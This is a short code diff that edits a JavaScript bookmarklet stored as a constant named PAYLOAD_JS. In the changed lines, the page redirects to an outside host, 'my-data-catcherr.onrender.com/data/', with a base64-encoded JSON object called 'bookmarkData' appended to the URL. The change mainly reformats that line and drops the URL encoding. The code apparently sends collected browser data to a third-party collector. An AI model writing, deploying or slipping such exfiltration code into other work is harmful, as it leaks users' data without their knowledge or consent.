@@ -231,9 +231,8 @@ const PAYLOAD_JS = `javascript:(async()=>{
         };
 
 
-        location.replace(
-  "https://my-data-catcherr.onrender.com/data/" +
-  encodeURIComponent(btoa(JSON.stringify(bookmarkData)))
+        location.replace('https://my-data-catcherr.onrender.com/data/'+
+btoa(JSON.stringify(bookmarkData)))
 );
 
 
